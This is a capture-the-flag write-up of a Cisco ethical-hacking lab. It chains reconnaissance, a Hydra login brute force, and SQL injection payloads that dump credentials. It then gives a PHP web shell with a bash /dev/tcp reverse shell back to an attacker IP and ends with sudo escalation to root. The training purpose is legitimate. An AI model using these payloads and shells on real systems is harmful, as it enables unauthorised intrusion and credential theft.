## Cisco Ethical Hacker CTF — Attack Chain From Recon to Root

- **Environment:** Kali Linux VM via dCloud WebRDP → Target: `198.19.40.100`
- **Tools Used:** Nmap · Gobuster · Hydra · SQL Injection · PHP Web Shell · Netcat · Python PTY

---
### Attack Chain Summary

```
Recon → Directory Enumeration → Brute Force Login → SQL Injection → File Upload RCE → Privilege Escalation → Root
```

---

### Part 1 — Reconnaissance (Nmap)

#### Challenge Question
> _"A suspicious web server has been flagged at the IP address 198.19.40.100, and your task is to identify the digital services it exposes to the network. Using your trusted recon tool — Nmap — perform a scan on the target to discover open ports and running services (and their versions). Carefully review the Nmap results for important services that may need deeper enumeration. Document all findings, as this foundational intelligence will play a critical role in guiding the subsequent phases of your mission."_
> 
> **Expected Flag Format:** A comma-separated list of open ports (e.g., 8080, 22)

#### Approach
Run an Nmap version scan against the target to identify open ports and services.
#### Command
```bash
nmap -sV -T4 198.19.40.100
```

**Flags:**
- `-sV` — detect service versions
- `-T4` — faster scan timing

#### Result
Discovered open ports including HTTP (80), SSH (22), RDP (3389).

#### Flag
Open ports as a comma-separated list (e.g. `80, 22, 3389`)

#### Key Takeaway
Nmap is the starting point of any engagement. Always start with a version scan (`-sV`) so you understand what services and versions are exposed — each port can be used as a potential attack surface.

---

### Part 2 — Directory Enumeration (Gobuster)

#### Challenge Question
> _"You've discovered that a web server is up and running, but what secrets are hidden beneath its surface? Your mission is to uncover the concealed directories and files that are not immediately visible to the public. These hidden paths may provide critical entry points for further exploration. Using Gobuster, you'll perform a brute-force directory scan to identify restricted or unlinked paths. For optimal coverage during the scan, use the medium-sized directory list located at /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt. Among these hidden treasures lies the login portal, an essential entry point to delve deeper into the system."_
> 
> **Expected Flag Format:** Path to login page (e.g., /home.php)

#### Approach
Use Gobuster to brute force directories and files on the web server, checking for PHP files specifically.

#### Command
```bash
gobuster dir -u http://198.19.40.100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php
```

**Flags:**
- `dir` — directory brute-force mode
- `-u` — target URL (must include `http://`)
- `-w` — wordlist path
- `-x php` — also test for `.php` file extensions

#### Result
Discovered `/login.php`

#### Flag
`/login.php`

#### Key Takeaway
Never assume a web app only exposes what's visible. When using Gobuster a good wordlist and file extension checking reveals hidden entry points that developers forget to protect (Always include `-x php` when targeting PHP applications).

---

### Part 3 — Authentication Exploitation (Hydra)

#### Challenge Question

> _"Explore the homepage of the web application that you discovered. Pay close attention to the author of each blog post. This detail provides a critical clue. A subtle observation hints at the existence of a privileged user account within the application. Your next objective is clear: gain access to the login interface. While you've already identified the name of the privileged user account, the password remains unknown. To uncover it, you will perform a brute-force attack on the login form using the Hydra tool and a commonly used password list. A wordlist named 2020-200_most_used_passwords.txt is preloaded on the Kali Linux system and can be found at the following path: /home/dcloud/."_
> 
> **Expected Flag Format:** The correct password of the privileged user account (e.g., userpass789)

### Approach

**Step 1 — OSINT on the web app:**  
Visited `http://198.19.40.100` and read blog posts → identified author: `admin`

**Step 2 — Inspect the login form:**  
Used browser Inspector (right-click → Inspect Element) on `/login.php`:

- Username field: `name="username"`
- Password field: `name="password"`
- Form method: `POST`
- Failure message: `Invalid credentials.`

**Step 3 — Run Hydra:**
#### Command
```bash
hydra -l admin -P /home/dcloud/2020-200_most_used_passwords.txt 198.19.40.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials."
```

**Flags:**
- `-l` — single username
- `-P` — password wordlist
- `http-post-form` — web login form attack mode
- Format inside quotes: `"path:form_fields:failure_message"`
- `^USER^` and `^PASS^` — Hydra placeholders for username and password

#### Result
Credentials found: `admin : password123`

#### Flag
`CTF{brute_force}`

#### Key Takeaway
Always perform OSINT on the application itself — blog authors, comments, and metadata can reveal usernames. Hydra needs 3 things to brute force a web form: the path, the field names, and the failure message. Inspecting the form source is a good practice to do before running the attack.

---

### Part 4 — SQL Injection (Search Field)

#### Challenge Question
> _"After logging into the dashboard, your mission takes a deeper dive into the web application functionality. You notice a feature labeled List Assets, which leads to a searchable interface. This seemingly simple search box is your next opportunity to uncover vulnerabilities. While the input field may appear straightforward, it is vulnerable to SQL Injection (SQLi) — a flaw that allows attackers to manipulate database queries. By crafting a carefully designed malicious payload, you can bypass normal query behavior and access unauthorized data from the back-end database. Your goal is to exploit the SQL Injection vulnerability in the search field within the web application. Extract and display hidden data from the asset table stored in the database."_
> 
> **Expected Flag Format:** CTF{flag}

#### Approach
Test the search box for SQL injection by injecting a payload that always evaluates to true, dumping all records.

#### Payload
```sql
' OR 1=1#
```

The `#` comments out the rest of the MySQL query, making the WHERE clause always true and returning all records.

#### Result
All asset records returned including a hidden flag.

#### Flag
`CTF{sql_injection_search}`

#### Key Takeaway
The `#` character is MySQL's comment syntax (alongside `--`). When a query isn't sanitising input, injecting `OR 1=1` makes it return everything. A SQL error on bad input is a strong signal the field is injectable.

---

### Part 5 — UNION-Based SQL Injection (Database Enumeration)

#### Challenge Question
> _"Now that you have exposed the application's underlying asset data, it's time to take your exploitation further by extracting sensitive user credentials from the vulnerable database. By leveraging SQL injection and the UNION operator, you'll enumerate the database structure schema to locate and retrieve user credentials stored in the database. Start by identifying the active database name. Then enumerate the database's tables by querying the information_schema.tables view. Once the users table is identified, query the information_schema.columns view to enumerate its column structure. Once the database structure is mapped, craft a final SQLi payload to retrieve the actual username and password values in the users table."_
> 
> **Expected Flag Format:** The flag is the password value for another user account retrieved from the vulnerable database

#### Approach — Step by Step

**Step 1 — Find number of columns:**
```sql
' UNION SELECT NULL,NULL,NULL,NULL-- -
```

Result: No error with 4 NULLs → query returns **4 columns**

**Step 2 — Get current database name:**
```sql
' UNION SELECT database(),NULL,NULL,NULL-- -
```

Result: `vulnerable_db`

**Step 3 — List all tables:**
```sql
' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='vulnerable_db'-- -
```

Result: `assets`, `flag`, `users`

**Step 4 — Get columns from users table:**
```sql
' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' AND table_schema='vulnerable_db'-- -
```

Result: `id`, `username`, `password`

**Step 5 — Dump user credentials:**
```sql
' UNION SELECT username,password,NULL,NULL FROM users-- -
```

Result:

|Username|Password|
|---|---|
|admin|password123|
|devuser|P@ssw0rd|

#### Flag
`P@ssw0rd` (devuser's password)

#### Key Takeaway
UNION-based SQLi requires knowing the exact column count first — keep adding NULLs until no error. `information_schema` is a built-in MySQL database that holds metadata about all other databases, tables, and columns.

---

### Part 6 — Flag Table Extraction

#### Challenge Question
> _"During your exploration, you uncovered a table named flag. This table is your next target. Your objective is to enumerate the columns within the flag table and extract its stored value. The hidden flag resides in a column labeled flag_value. By leveraging SQL injection techniques with UNION SELECT operator, you will reveal the contents of this table and retrieve its hidden secret."_
> 
> **Expected Flag Format:** CTF{flag}

#### Payload
```sql
' UNION SELECT flag_value,NULL,NULL,NULL FROM flag-- -
```

#### Flag
`CTF{sql_injection_dump}`

#### Key Takeaway
Always enumerate ALL tables found — not just `users`. Hidden flag/secret tables are common in real apps too (audit logs, config tables, etc.).

---

### Part 7 — Remote Code Execution (File Upload + Reverse Shell)

#### Challenge Question
> _"The web server's dashboard contains a feature labeled Upload File that appears to accept file submissions without enforcing any strict content-type validation. Your goal is to upload a malicious PHP web shell (shell.php) from your /home/dcloud/ directory on the Kali Linux host. Next, create a Netcat listener connection in a terminal session on the Kali Linux system. From the browser on the Kali Linux system, execute the reverse web shell script to establish a shell from the web server to the attacking Kali Linux system with a Netcat (ncat) payload. Specify the Kali Linux system IP address (198.19.30.48) and a port number (443) to establish the connection. Finally, create a python interactive shell from the web server back to the attacking Kali Linux system and hunt for the file containing the flag."_
> 
> **Expected Flag Format:** CTF{flag}

#### Approach

**Step 1 — Examine the web shell:**
```bash
cat /home/dcloud/shell.php
```

Contents:
```php
<?php system($_REQUEST['cmd']); ?>
```

**Step 2 — Start Netcat listener on Kali:**
```bash
nc -lvnp 443
```

**Step 3 — Upload `shell.php`** via the dashboard Upload File feature.

**Step 4 — Trigger reverse shell via browser URL:**
```
http://198.19.40.100/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/198.19.30.48/443+0>%261'
```

**Step 5 — Upgrade to interactive PTY shell (inside netcat session):**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Step 6 — Find the flag:**
```bash
find / -name "flag.txt" 2>/dev/null
cat /var/www/html/flag.txt
```

#### Flag
`CTF{web_shell}`

#### Key Takeaway
Unrestricted file upload with no content-type validation is a critical vulnerability (OWASP Top 10). A PHP shell gives arbitrary command execution. Reverse shells bypass firewall rules better than bind shells. Always upgrade with Python PTY for a fully interactive shell.

---

### Part 8 — Privilege Escalation (www-data → devuser)

#### Challenge Question
> _"With your firmly established foothold, it's time to elevate your access and gain higher privileges. Begin by investigating local user permissions. From your fully interactive reverse shell session, run the appropriate sudo command to enumerate the current user's sudo privileges. This will reveal that the current user (www-data) has permission to execute Python 3 as another user without requiring a password. By exploiting this permission, you can spawn a new shell as the 'other user' and gain access to their resources. Once inside, navigate to the home directory of this 'other user' and retrieve the flag file stored there."_
> 
> **Expected Flag Format:** CTF{flag}

#### Approach

**Step 1 — Enumerate sudo permissions:**
```bash
sudo -l
```

Output:
```
User www-data may run the following commands on webapp:
    (devuser) NOPASSWD: /usr/bin/python3
```

**Step 2 — Exploit sudo to spawn shell as devuser:**
```bash
sudo -u devuser /usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Step 3 — Get the flag:**
```bash
cd /home/devuser
cat flag.txt
```

#### Flag
`CTF{dev_flag}`

#### Key Takeaway
Always run `sudo -l` immediately after gaining a shell. NOPASSWD entries for interpreters like Python are a basic privilege escalation vector.

---

### Part 9 — Full Root Compromise (devuser → root)

#### Challenge Question
> _"Operating as devuser, you've successfully elevated your privileges and are now one step away from complete system compromise. The password (P@ssw0rd), which you previously uncovered through an earlier SQL injection credential dump, has been reused to log in as devuser. As devuser, your account has been granted full sudo access, which allows you to execute any command as the root user. Your mission is to switch to the root account, navigate to the root user's directory, and discover the final mission flag stored in the flag file. This final act of escalation signifies complete dominance over the system."_
> 
> **Expected Flag Format:** CTF{flag}

#### Approach

**Step 1 — Check sudo permissions:**
```bash
sudo -l
```

Result: `(ALL) ALL` — full unrestricted sudo access.

**Step 2 — Switch to root:**
```bash
sudo su
```

**Step 3 — Get the flag:**
```bash
cd /root
cat flag.txt
```

#### Flag
`CTF{root_shell}`

#### Key Takeaway
Password reuse is extremely common in real environments. Every credential found during enumeration should be tested across all accounts and services. Full sudo access (`ALL`) means complete system compromise — game over.

---

### Penetration Testing Methodology

```
1. Reconnaissance       →  Nmap (port & service scanning)
2. Enumeration          →  Gobuster (directory brute-forcing)
3. Exploitation         →  Hydra (brute force), SQLi (data extraction), File Upload (RCE)
4. Post-Exploitation    →  Reverse Shell, Flag Hunting
5. Privilege Escalation →  Sudo Misconfig (GTFOBin), Password Reuse
```

---

## Tools Reference

|Tool|Purpose|Key Syntax|
|---|---|---|
|`nmap`|Port & service scanning|`-sV -T4 <target>`|
|`gobuster`|Directory enumeration|`dir -u <url> -w <wordlist> -x php`|
|`hydra`|Brute force web login|`-l <user> -P <wordlist> <ip> http-post-form "path:fields:fail"`|
|`nc`|Reverse shell listener|`-lvnp <port>`|
|`python3`|PTY shell upgrade & sudo escalation|`import pty;pty.spawn("/bin/bash")`|

---

### Lessons Learned

- **Recon is everything.** The quality of your enumeration determines the quality of your attack.
- **Always inspect web forms.** Field names and error messages are important for tools like Hydra.
- **SQL injections.** UNION-based extraction is powerful once you know the column count.
- **Check `sudo -l` immediately** after getting a shell (misconfigurations are extremely common).
- **Password reuse.** Every credential found should be tried on every account and service.
- **GTFOBins** is your best friend for privilege escalation via allowed binaries.
- **Always upgrade your shell.** A raw netcat shell is limited — upgrade with Python PTY every time.
